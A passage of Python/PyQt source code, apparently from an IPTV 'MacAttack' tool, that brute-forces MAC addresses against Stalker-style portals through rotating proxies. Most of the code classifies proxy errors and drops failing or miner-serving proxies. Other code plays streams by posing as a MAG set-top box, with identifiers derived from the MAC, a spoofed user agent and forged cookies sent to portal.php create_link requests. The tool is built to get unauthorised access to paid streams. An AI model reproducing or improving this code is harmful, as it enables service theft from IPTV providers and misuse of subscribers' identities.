                            self.proxy_error_counts[selected_proxy] += 1                       
                        self.update_error_text_signal.emit(f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>Access Denied</b> blocked access")
                        self.remove_proxy(selected_proxy, self.proxy_error_counts) # remove the proxy if it exceeds the allowed error count
                    elif "Access Denied" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1                       
                        self.update_error_text_signal.emit(f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>Access Denied</b> blocked access")
                        self.remove_proxy(selected_proxy, self.proxy_error_counts) # remove the proxy if it exceeds the allowed error count
                    elif "502 Proxy Error " in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1                       
                        self.update_error_text_signal.emit(f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>502 Proxy Error</b> proxy server issue")
                        self.remove_proxy(selected_proxy, self.proxy_error_counts) # remove the proxy if it exceeds the allowed error count
                    elif "500 Internal Server Error" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1                       
                        self.update_error_text_signal.emit(f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>500 Internal Server Error</b> proxy server issue")
                        self.remove_proxy(selected_proxy, self.proxy_error_counts) # remove the proxy if it exceeds the allowed error count
                    elif "generateText('internal_error');" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1                       
                        self.update_error_text_signal.emit(f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>500 Internal Server Error</b> proxy server issue")
                        self.remove_proxy(selected_proxy, self.proxy_error_counts) # remove the proxy if it exceeds the allowed error count
                    elif "Host header port mismatch" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1                       
                        self.update_error_text_signal.emit(f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>Host header port mismatch</b> proxy port does not match")
                        self.remove_proxy(selected_proxy, self.proxy_error_counts) # remove the proxy if it exceeds the allowed error count
                    elif "connections reached" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1 
                        self.update_error_text_signal.emit(f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>Proxy Overloaded</b> Maximum number of open connections reached.")
                        self.remove_proxy(selected_proxy, self.proxy_error_counts) # remove the proxy if it exceeds the 
                    elif "DNS resolution error" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1                       
                        self.update_error_text_signal.emit(f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>DNS resolution error</b> DNS Issue with proxy")
                        self.remove_proxy(selected_proxy, self.proxy_error_counts) # remove the proxy if it exceeds the allowed error count
                    elif "ERR_DNS_FAIL" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1                       
                        self.update_error_text_signal.emit(f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>DNS resolution error</b> DNS Issue with proxy")
                        self.remove_proxy(selected_proxy, self.proxy_error_counts) # remove the proxy if it exceeds the allowed error count
                    elif "302 Found" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1                       
                        self.update_error_text_signal.emit(f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>302 Found</b> Proxy tried to redirect us")
                        self.remove_proxy(selected_proxy, self.proxy_error_counts) # remove the proxy if it exceeds the allowed error count
                    elif "504 Gateway" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1                       
                        self.update_error_text_signal.emit(f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>504 Gateway Time-out</b> Proxy timed out")
                        self.remove_proxy(selected_proxy, self.proxy_error_counts) # remove the proxy if it exceeds the allowed error count
                    elif "504 DNS look up failed" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1                       
                        self.update_error_text_signal.emit(f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>504 DNS look up failed</b> DNS Issue with proxy")
                        self.remove_proxy(selected_proxy, self.proxy_error_counts) # remove the proxy if it exceeds the allowed error count
                    elif "502 Bad Gateway" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1                       
                        self.update_error_text_signal.emit(f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>502 Bad Gateway</b> Proxy communication issue")
                        self.remove_proxy(selected_proxy, self.proxy_error_counts) # remove the proxy if it exceeds the allowed error count
                    elif "miner.start" in res.text:
                        self.update_error_text_signal.emit(f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>Fake Proxy</b> part of a bitcoin botnet")
                        # remove immediately
                        if isinstance(proxies, list):
                            if selected_proxy in proxies:
                                proxies.remove(selected_proxy)
                        # Update the QTextEdit to remove the proxy
                        current_text = self.proxy_textbox.toPlainText()
                        new_text = "\n".join([line for line in current_text.splitlines() if line.strip() != selected_proxy])
                        self.macattack_update_proxy_textbox_signal.emit(new_text)
                        self.update_error_text_signal.emit(
                            f"Proxy {selected_proxy} Fake proxy removed."
                        )
                    # even with cloudflare, a proxy can still get json results, removed this because every proxy spams
                    #elif "Cloudflare" in res.text:
                    #    self.update_error_text_signal.emit(f"Error for Portal: {selected_proxy} : <b>Cloudflare Blocked</b> blocked by Cloudflare")
                    elif "no such host" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1                       
                        self.update_error_text_signal.emit(f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>no such host</b> not connecting to portal")
                        self.remove_proxy(selected_proxy, self.proxy_error_counts) # remove the proxy if it exceeds the allowed error count
                    elif "Royalty - Staffing" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1                       
                        self.update_error_text_signal.emit(f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>Royalty - Staffing</b> WTF even is this?")
                        self.remove_proxy(selected_proxy, self.proxy_error_counts) # remove the proxy if it exceeds the allowed error count
                    elif "ERROR: Not Found" in res.text:
                        self.update_error_text_signal.emit(f"Error for Portal: {selected_proxy} : <b>Portal not found</b> invalid IPTV link")
                    elif "403 Forbidden" in res.text: #i dont think this is an error
                        self.proxy_error_counts[selected_proxy] = 0
                    elif "Connection to server failed" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1
                        self.update_error_text_signal.emit(f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>Not connecting</b> Proxy not connecting to server, failures: {self.proxy_error_counts[selected_proxy]}")
                        # Attempt to remove the proxy if it exceeds the allowed error count
                        self.remove_proxy(selected_proxy, self.proxy_error_counts)
                    elif "Max retries exceeded" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1
                        self.update_error_text_signal.emit(f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>Not connecting</b> Proxy offline")
                        # Attempt to remove the proxy if it exceeds the allowed error count
                        self.remove_proxy(selected_proxy, self.proxy_error_counts)
                    elif "Read timed out" in res.text:
                        # Track error count for the proxy
                        if selected_proxy not in self.proxy_error_counts:
                            self.proxy_error_counts[selected_proxy] = 1
                        else:
                            self.proxy_error_counts[selected_proxy] += 1
                        self.update_error_text_signal.emit(f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>Timed out</b>")
                        # Attempt to remove the proxy if it exceeds the allowed error count
                        self.remove_proxy(selected_proxy, self.proxy_error_counts)

                    
                    elif mac in res.text:
                        #good result, reset errors
                        self.proxy_error_counts[selected_proxy] = 0
                        logging.debug(f"Raw Response Content:\n{mac}\n%s", res.text)
             
                    else:
                        
                            #self.update_error_text_signal.emit(f"Error for MAC {mac}: {str(e)}")
                        #logging.debug(f"{str(e)}")
                        logging.debug(f"Raw Response Content:\n{mac}\n%s", res.text)
                    self.error_count += 1
        
    def remove_proxy(self, proxy, proxy_error_counts):
        """Remove a proxy after exceeding error count and update UI."""
        error_limit = self.proxy_remove_errorcount.value()
        if error_limit > 0 and self.proxy_error_counts.get(proxy, 0) >= error_limit:
            # Remove proxy from the list
            current_text = self.proxy_textbox.toPlainText()
            new_text = "\n".join(line for line in current_text.splitlines() if line.strip() != proxy)
            self.macattack_update_proxy_textbox_signal.emit(new_text)

            # Remove proxy from dictionary
            self.proxy_error_counts.pop(proxy, None)

            # Notify user
            self.update_error_text_signal.emit(f"Proxy {proxy} removed after exceeding {error_limit} consecutive errors.")
            #raise StopIteration  # This will stop the loop in BigMacAttack
            
    def temp_remove_proxy(self, proxy):
        ratelimit_timeout = 60
        """Temporarily remove a proxy for ratelimit_timeout seconds, then re-add it."""
        # Get the current text in the proxy_textbox
        current_text = self.proxy_textbox.toPlainText()

        # Check if the proxy exists before attempting to remove it
        if proxy in current_text.splitlines():
            # Remove proxy from the list temporarily
            new_text = "\n".join(line for line in current_text.splitlines() if line.strip() != proxy)
            self.macattack_update_proxy_textbox_signal.emit(new_text)

            # Notify user of temporary removal
            self.update_error_text_signal.emit(f"Proxy {proxy} temporarily removed.")

            # Define a function to re-add the proxy after 10 seconds
            def re_add_proxy():
                # Get the updated state of proxy_textbox
                updated_text = self.proxy_textbox.toPlainText()

                # Check if the proxy already exists in the updated text
                if proxy not in updated_text.splitlines():
                    # Append the proxy to the end
                    new_text = f"{updated_text}\n{proxy}".strip()
                    self.macattack_update_proxy_textbox_signal.emit(new_text)

                    # Notify user of re-addition
                    self.update_error_text_signal.emit(f"Proxy {proxy} re-added after {ratelimit_timeout} seconds.")
                #else:
                    # Notify user that the proxy already exists
                #    self.update_error_text_signal.emit(f"Proxy {proxy} already exists, not re-added.")

            # Start a thread to handle the delayed re-addition
            threading.Timer(ratelimit_timeout, re_add_proxy).start()
        #else:
            # Notify user that the proxy does not exist
            #self.update_error_text_signal.emit(f"Proxy {proxy} not found, no removal performed.")
        
    def play_success_sound(self):
        # Determine the base path for the sound file
        if getattr(sys, 'frozen', False):  # Check if the app is frozen (i.e., packaged with PyInstaller)
            base_path = sys._MEIPASS
        else:
            base_path = os.path.abspath(".")

        # Construct the path to the sound file
        sound_path = os.path.join(base_path, 'include', 'success.mp3')

        try:
            # Create VLC media player instance and play the sound
            soundplayer = vlc.MediaPlayer(sound_path)
            soundplayer.play()

            # Optional: Wait for the sound to finish (based on media length)
            duration = soundplayer.get_length() / 1000  # Convert milliseconds to seconds
            if duration > 0:  # Only wait if duration is properly determined
                time.sleep(duration)
        except Exception as e:
            logging.debug(f"Error playing sound with VLC: {e}")

    def OutputMastermind(self):
        # Fancy file-naming because why not complicate things?
        current_time = datetime.now().strftime("%m%d_%H%M%S")
        sanitized_url = self.base_url.replace("http://", "").replace("https://", "").replace("/", "_").replace(":", "-")
        filename = f"{sanitized_url}_{current_time}.txt"
        return filename
    
    def GiveUp(self):
        # Disable further user input immediately
        logging.debug("GiveUp initiated: Preparing to stop threads.")
        self.running = False

        # Disable buttons while stopping threads
        self.stop_button.setDisabled(True)

        # Set a delay for updating the brute_mac_label
        QTimer.singleShot(3000, lambda: self.brute_mac_label.setText(
            "Please Wait...\nThere are proxies in the background finishing their tasks."
        ))

        # Start a thread to handle thread cleanup
        cleanup_thread = threading.Thread(target=self._wait_for_threads)
        cleanup_thread.start()
        
    def _wait_for_threads(self):
        logging.debug("Waiting for threads to finish...")
        
        # Wait for all threads to complete
        if hasattr(self, 'threads'):
            for thread in self.threads:
                if thread.is_alive():
                    thread.join()  # Wait for the thread to complete

        # Once all threads are done, reset the GUI on the main thread
        QTimer.singleShot(0, self._reset_gui_after_cleanup)

    def _reset_gui_after_cleanup(self):
        # Safely reset GUI elements on the main thread
        logging.debug("All threads stopped. Resetting GUI.")
        self.threads = []  # Clear the thread list
        self.start_button.setDisabled(False)
        self.stop_button.setDisabled(True)
        self.brute_mac_label.setText("")

        # Close the output file if it was open
        if hasattr(self, 'output_file') and self.output_file:
            try:
                self.output_file.close()
                logging.debug("Output file closed successfully.")
            except Exception as e:
                logging.error(f"Error closing output file: {str(e)}")
            finally:
                self.output_file = None

    def ErrorAnnouncer(self, message):
        self.error_text.append(message)
                
    def stop_request_thread(self):
        if self.current_request_thread is not None:
            self.current_request_thread.requestInterruption()
            logging.debug("RequestThread interruption requested.")
        
    def set_progress(self, value):
        # Animate the progress bar to the new value
        if self.progress_animation.state() == QPropertyAnimation.Running:
            self.progress_animation.stop()
        start_val = self.progress_bar.value()
        self.progress_animation.setStartValue(start_val)
        self.progress_animation.setEndValue(value)
        self.progress_animation.start()
        logging.debug(f"Animating progress bar from {start_val} to {value}.")

    def start_new_thread(self, tab_name, category_type, category_id):
        self.request_thread = RequestThread(self.base_url, self.mac_address, category_type, category_id)
        self.request_thread.update_progress.connect(self.set_progress)
        self.request_thread.channels_loaded.connect(lambda channels: self.on_channels_loaded(tab_name, channels))
        self.request_thread.start()
        self.current_request_thread = self.request_thread
        logging.debug(f"Started RequestThread for channels in category {category_id}.")               

    def on_playlist_selection_changed(self, index):
        sender = self.sender()
        current_tab = None
        for tab_name, self.tab_info in self.tab_data.items():
            if sender == self.tab_info["playlist_view"]:
                current_tab = tab_name
                break
        else:
            self.error_label.setText("Unknown sender for on_playlist_selection_changed")
            self.error_label.setVisible(True)
            return

        self.tab_info = self.tab_data[current_tab]
        self.playlist_model = self.tab_info["self.playlist_model"]

        if index.isValid():
            item = self.playlist_model.itemFromIndex(index)
            item_text = item.text()
            logging.debug(self.playlist_model.itemFromIndex(index).text())

            # Handle 'Go Back' functionality separately
            if item_text == "Go Back":
                self.visible_data = self.tab_info.get("playlist_data", [])
                if self.tab_info["navigation_stack"]:
                    logging.debug(f"NAV STACK{self.tab_info["navigation_stack"]}")

                    
                    nav_state = self.tab_info["navigation_stack"].pop()
                    self.tab_info["current_category"] = nav_state.get("category", "default_category_value")
                    self.tab_info["current_view"] = nav_state.get("view", "undefined_view_value")
                    self.tab_info["current_series_info"] = nav_state.get("series_info", None)
                    logging.debug(f"Go Back to view: {self.tab_info['current_view']}")

                    if self.tab_info["current_view"] == "categories":
                        self.update_playlist_view(current_tab)
                    elif self.tab_info["current_view"] == "channels":
                        self.update_channel_view(current_tab)
                                     
##TODO fix this, have to click the go back item twice to nav back                        
                    elif self.tab_info["current_view"] == "seasons":
                        self.update_series_view(current_tab)
                    elif self.tab_info["current_view"] == "episodes":
                        self.update_series_view(current_tab)
                        
                        
                        
                else:
                    logging.debug("Navigation stack is empty. Cannot go back.")
                    self.get_playlist()

            else:
                item_data = item.data(Qt.UserRole)
                item_type = item.data(Qt.UserRole + 1)
                logging.debug(f"Item data: {item_data}, item type: {item_type}")

                if item_type == "category":
                    self.tab_info["navigation_stack"].append(
                        {
                            "category": self.tab_info["current_category"],
                            "view": self.tab_info["current_view"],
                            "series_info": self.tab_info["current_series_info"],
                        }
                    )
                    self.tab_info["current_category"] = item_data
                    logging.debug(f"Navigating to category: {item_data.get('name')}")
                    self.retrieve_channels(current_tab, self.tab_info["current_category"])

                elif item_type == "series":
                    # Clear the series list when navigating to a specific series (only seasons should be shown now)
                    self.tab_info["navigation_stack"].append(
                        {
                            "category": self.tab_info["current_category"],
                            "view": self.tab_info["current_view"],
                            "series_info": self.tab_info["current_series_info"],
                        }
                    )
                    self.tab_info["current_category"] = item_data
                    self.tab_info["current_view"] = "seasons"  # Update the view to "seasons"
                    self.update_series_view(current_tab)  # Only seasons should be shown now

                    logging.debug(f"Navigating to series: {item_data.get('name')}")
                    self.retrieve_series_info(current_tab, item_data)

                elif item_type == "season":
                    self.tab_info["navigation_stack"].append(
                        {
                            "category": self.tab_info["current_category"],
                            "view": self.tab_info["current_view"],
                            "series_info": self.tab_info["current_series_info"],
                        }
                    )
                    self.tab_info["current_category"] = item_data
                    self.tab_info["current_view"] = "episodes"  # If it's a season, show episodes now
                    self.update_series_view(current_tab)
                    

                    logging.debug(f"Fetching episodes for season {item_data['season_number']} in series {item_data['name']}")
                    self.retrieve_series_info(
                        current_tab,
                        item_data,
                        season_number=item_data["season_number"],
                    )

                elif item_type == "episode":
                    logging.debug(f"Playing episode: {item_data.get('name')}")
                    self.play_channel(item_data)

                elif item_type in ["channel", "vod"]:
                    logging.debug(f"Playing channel/VOD: {item_data.get('name')}")
                    self.play_channel(item_data)

                else:
                    self.error_label.setText("Unknown item type")
                    self.error_label.setVisible(True)
            
    def play_channel(self, channel):
        cmd = channel.get("cmd")
        if not cmd:
            logging.error(f"No command found for channel: {channel}")
            return
        if cmd.startswith("ffmpeg "):
            cmd = cmd[len("ffmpeg ") :]

        item_type = channel.get("item_type", "channel")

        if item_type == "channel":
            needs_create_link = False
            if "/ch/" in cmd and cmd.endswith("_"):
                needs_create_link = True

            if needs_create_link:
                try:
                    session = requests.Session()
                    url = self.base_url
                    mac_address = self.mac_address
                    token = get_token(session, url, mac_address)
                    if token:
                        cmd_encoded = quote(cmd)

                        #convert the mac into various hashes, if anything this will add randomness to the requests
                        mac_md5 = hashlib.md5(mac_address.encode('utf-8')).hexdigest().upper()
                        mac_sha256 = hashlib.sha256(mac_address.encode('utf-8')).hexdigest().upper()
                        mac_sha1 = hashlib.sha1(mac_address.encode('utf-8')).hexdigest()

                        
                        serial = mac_md5 #cant be right, looks like the serial is only supposed to be 13 digits from what i am reading
                        device_id = mac_sha256
                        device_id2_input = serial[:13] + mac_address  # Combine first 13 digits of MD5 + MAC
                        device_id2 = hashlib.sha256(device_id2_input.encode('utf-8')).hexdigest().upper()  # SHA256 of the combined input

                        cookies = {           
                            "adid": mac_sha1,
                            "debug": "1",
                            "device_id2": device_id2,
                            "device_id": device_id,
                            "hw_version": "1.7-BD-00",
                            "mac": mac_address,
                            "sn": serial[:13], #cut to 13 digits
                            "stb_lang": "en",
                            "timezone": "America/Los_Angeles", 
                        }
                        headers = {
                            "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
                            "Authorization": f"Bearer {token}",
                            "X-User-Agent": "Model: MAG250; Link: WiFi",
                        }
                        create_link_url = f"{url}/portal.php?type=itv&action=create_link&cmd={cmd_encoded}&JsHttpRequest=1-xml"
                        logging.info(f"Create link URL: {create_link_url}")
                        response = session.get(
                            create_link_url, cookies=cookies, headers=headers, timeout=20
                        )
                        response.raise_for_status()
                        json_response = response.json()
                        logging.debug(f"Create link response: {json_response}")
                        cmd_value = json_response.get("js", {}).get("cmd")
                        if cmd_value:
                            if cmd_value.startswith("ffmpeg "):
                                cmd_value = cmd_value[len("ffmpeg ") :]
                            stream_url = cmd_value
                            self.launch_videoPlayer(stream_url)
                        else:
                            self.error_label.setText("Stream URL not found in the response.")
                            self.error_label.setVisible(True)
                    else:
                        self.error_label.setText("Failed to retrieve token.")
                        self.error_label.setVisible(True)
                except Exception as e:
                    logging.error(f"Error creating stream link: {e}")
                    QMessageBox.critical(
                        self, "Error", f"Error creating stream link: {e}"
                    )
            else:
                self.launch_videoPlayer(cmd)

        elif item_type in ["episode", "vod"]:
            try:
                session = requests.Session()
                url = self.base_url
                mac_address = self.mac_address
                token = get_token(session, url, mac_address)
                if token:
                    cmd_encoded = quote(cmd)

                    #convert the mac into various hashes, if anything this will add randomness to the requests
                    mac_md5 = hashlib.md5(mac_address.encode('utf-8')).hexdigest().upper()
                    mac_sha256 = hashlib.sha256(mac_address.encode('utf-8')).hexdigest().upper()
                    mac_sha1 = hashlib.sha1(mac_address.encode('utf-8')).hexdigest()

                    
                    serial = mac_md5 #cant be right, looks like the serial is only supposed to be 13 digits from what i am reading
                    device_id = mac_sha256
                    device_id2_input = serial[:13] + mac_address  # Combine first 13 digits of MD5 + MAC
                    device_id2 = hashlib.sha256(device_id2_input.encode('utf-8')).hexdigest().upper()  # SHA256 of the combined input

                    cookies = {           
                        "adid": mac_sha1,
                        "debug": "1",
                        "device_id2": device_id2,
                        "device_id": device_id,
                        "hw_version": "1.7-BD-00",
                        "mac": mac_address,
                        "sn": serial[:13], #cut to 13 digits
                        "stb_lang": "en",
                        "timezone": "America/Los_Angeles",             
                    }
                    
                    headers = {
                        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
                        "Authorization": f"Bearer {token}",
                        "X-User-Agent": "Model: MAG250; Link: WiFi",
                    }
                    if item_type == "episode":
                        episode_number = channel.get("episode_number")
                        if episode_number is None:
                            self.error_label.setText("Episode number is missing.")
                            self.error_label.setVisible(True)
                            return
                        create_link_url = f"{url}/portal.php?type=vod&action=create_link&cmd={cmd_encoded}&series={episode_number}&JsHttpRequest=1-xml"
                    else:
                        create_link_url = f"{url}/portal.php?type=vod&action=create_link&cmd={cmd_encoded}&JsHttpRequest=1-xml"
                    logging.debug(f"Create link URL: {create_link_url}")
                    response = session.get(
                        create_link_url, cookies=cookies, headers=headers, timeout=20
                    )
                    response.raise_for_status()
                    json_response = response.json()
                    logging.debug(f"Create link response: {json_response}")
                    cmd_value = json_response.get("js", {}).get("cmd")
                    if cmd_value:
                        if cmd_value.startswith("ffmpeg "):
                            cmd_value = cmd_value[len("ffmpeg ") :]
                        stream_url = cmd_value
                        self.launch_videoPlayer(stream_url)
                    else:
                        self.error_label.setText("Stream URL not found in the response.")
                        self.error_label.setVisible(True)
                else:
                    self.error_label.setText("Failed to retrieve token.")
                    self.error_label.setVisible(True)
            except Exception as e:
                logging.error(f"Error creating stream link: {e}")
                QMessageBox.critical(
                    self, "Error", f"Error creating stream link: {e}"
                )
        else:
            logging.error(f"Unknown item type: {item_type}")
            QMessageBox.critical(
                self, "Error", f"Unknown item type: {item_type}"
            )
        
    def launch_videoPlayer(self, stream_url):
        
        stream_url = stream_url.replace("'ffmpeg' ", "")
        stream_url = stream_url.replace("ffmpeg ", "")
        self.update_proxy() #reset the vlc window with the proxy and referer
        
        
        self.error_label.setVisible(False)
        logging.debug(f"Launching media player with URL: {stream_url}")

        # If there is an existing worker thread, stop it first
        if self.video_worker is not None and self.video_worker.isRunning():
            self.video_worker.quit()  # Safely stop the worker
            if not self.video_worker.wait(3000):  # 3s timeout
                logging.debug("Warning: Worker thread did not stop in time.")
                if self.video_worker is not None and self.video_worker.isRunning():
                    logging.debug("Forcefully stopping the worker thread.")
                    self.video_worker.quit()
                    self.video_worker.terminate()  # Forcefully terminate
                    self.video_worker.wait()  # Wait for termination

        # Preload the media to minimize the delay when playing
        if self.videoPlayer.is_playing():
            self.videoPlayer.stop()

        self.videoPlayer.set_media(None)
        media = self.instance.media_new(stream_url)
        self.videoPlayer.set_media(media)

        # Start the worker thread to fetch stream URL in the background
        self.video_worker = VideoPlayerWorker(stream_url)
        self.video_worker.stream_url_ready.connect(self.on_stream_url_ready)
        self.video_worker.error_occurred.connect(self.on_error_occurred)

        # Start the thread (but don't play the video yet)
        self.video_worker.start()
        # Delay the actual video play call
        QTimer.singleShot(100, self.videoPlayer.play)

    def on_stream_url_ready(self, stream_url):
        logging.debug(f"Stream URL fetched: {stream_url}")
        self.videoPlayer.play()

    def on_error_occurred(self, error_message):
        logging.error(error_message)
        self.error_label.setText(error_message)
        self.error_label.setVisible(True)

    def modify_vlc_proxy(self, proxy_address):
        # Determine base_path based on whether the script is frozen or running as a script
        if getattr(sys, 'frozen', False):
            base_path = sys._MEIPASS  # For frozen executables
        else:
            base_path = os.path.abspath(".")  # For scripts run directly
        
        # Construct the full file path using base_path
        file_path = os.path.join(base_path, "include", "vlcrc")  # Use os.path.join for proper path construction
        
        # Read the file
        with open(file_path, 'r') as file:
            lines = file.readlines()
        
        # Modify the http-proxy line
        for i, line in enumerate(lines):
            if "http-proxy=" in line:  # Check if the line contains 'http-proxy='
                if proxy_address:
                    # If the proxy_address is provided, update the line
                    lines[i] = f"http-proxy={proxy_address}\n"
                else:
                    # If no proxy_address is provided, reset it to the commented line
                    lines[i] = "#http-proxy=\n"
        
        # Write the modified content back to the file
        with open(file_path, 'w') as file:
            file.writelines(lines)
            
    def mousePressEvent(self, event): #Pause/play video
        # Begin resizing when clicking on the border
        if event.button() == Qt.LeftButton:
            # Get mouse position
            pos = event.pos()

            # Check if within the top 30 pixels but excluding the corners (left 20, right 20, top 20)
            if 0 < pos.x() < self.width() - 30 and 0 < pos.y() < 30:
                self.moving = True
                self.move_start_pos = event.globalPos()  # Global position for moving
            # Check if near the borders (left, right, bottom) for resizing
            elif pos.x() < 40 or pos.x() > self.width() - 40 or pos.y() < 40 or pos.y() > self.height() - 40:
                self.resizing = True
                self.resize_start_pos = event.pos()        
        
        if self.tabs.currentIndex() == 1:  # Ensure we're on the Mac VideoPlayer tab
            if event.button() == Qt.LeftButton:  # Only respond to left-clicks
                if not self.resizing and not self.moving:
                    if self.videoPlayer.is_playing():  # Check if the video is currently playing
                        self.videoPlayer.pause()  # Pause the video
                    else:
                        self.videoPlayer.play()  # Play the video

    def mouseMoveEvent(self, event):
        if self.moving:
            # Move the window based on mouse movement
            delta = event.globalPos() - self.move_start_pos
            self.move(self.pos() + delta)
            self.move_start_pos = event.globalPos()

        elif self.resizing:
            # Resize the window based on mouse movement
            delta = event.pos() - self.resize_start_pos
            new_width = self.width() + delta.x()
            new_height = self.height() + delta.y()
            # Update window size while ensuring minimum size
            self.resize(max(new_width, 200), max(new_height, 200))
            # Update starting position for resizing
            self.resize_start_pos = event.pos()
            
    def mouseReleaseEvent(self, event):
        self.resizing = False
        self.moving = False

    def keyPressEvent(self, event):
        if event.key() == Qt.Key_Escape:
            # Create a fake mouse event to simulate a double-click
            fake_mouse_event = QMouseEvent(QEvent.MouseButtonDblClick, self.rect().center(), Qt.LeftButton, Qt.LeftButton, Qt.NoModifier)
            self.mouseDoubleClickEvent(fake_mouse_event)
            event.accept()  # Stop further handling of Escape key
        elif event.key() == Qt.Key_Space:
            # Toggle play/pause
            if self.videoPlayer.is_playing():  # Assuming isPlaying() checks if the video is currently playing
                self.videoPlayer.pause()
            else:
                self.videoPlayer.play()
            event.accept()  # Stop further handling of Space key
        else:
            super().keyPressEvent(event)  # Call base class method to handle other keys   

    def mouseDoubleClickEvent(self, event): #Fullscreen video
        if self.tabs.currentIndex() == 1:  # Ensure we're on the Mac VideoPlayer tab
            if event.button() == Qt.LeftButton:
                if self.windowState() == Qt.WindowNoState:
                    # Hide left_layout
                    for i in range(self.left_layout.count()):
                        widget = self.left_layout.itemAt(i).widget()
                        if widget:
                            widget.hide()
                    self.left_widget.hide()
                    self.showFullScreen()
                    self.videoPlayer.play()  # Play the video because it paused on the click
                    self.tabs.tabBar().setVisible(False) # Hide the tabs
                    self.topbar_layout.setContentsMargins(0, 0, 0, 0)
                    self.bottombar_layout.setContentsMargins(0, 0, 0, 0)
                    self.topbar_minimize_button.setVisible(False)
                    self.topbar_minimize_button.setEnabled(False)
                    self.topbar_close_button.setVisible(False)
                    self.topbar_close_button.setEnabled(False)
                else:
                    # Show left_layout
                    for i in range(self.left_layout.count()):
                        widget = self.left_layout.itemAt(i).widget()
                        if widget:
                            widget.show()
                    self.left_widget.show()
                    self.showNormal()  # Restore to normal window state
                    self.videoPlayer.play()  # Play the video because it paused on the click 
                    self.tabs.tabBar().setVisible(True) # Hide the tabs
                    self.topbar_layout.setContentsMargins(30, 5, 0, 0)
                    self.bottombar_layout.setContentsMargins(0, 30, 0, 0)
                    self.topbar_minimize_button.setVisible(True)
                    self.topbar_minimize_button.setEnabled(True)
                    self.topbar_close_button.setVisible(True)
                    self.topbar_close_button.setEnabled(True)
                    self.error_label.setVisible(False)

    def on_tab_change(self, index):
        if self.startplay == 1:
            if index == 1:  # When Tab 1 is selected
                self.videoPlayer.play()  # Play the video
                startplay = 0
            
        if self.autopause_checkbox.isChecked():
            if index == 1:  # When Tab 1 is selected
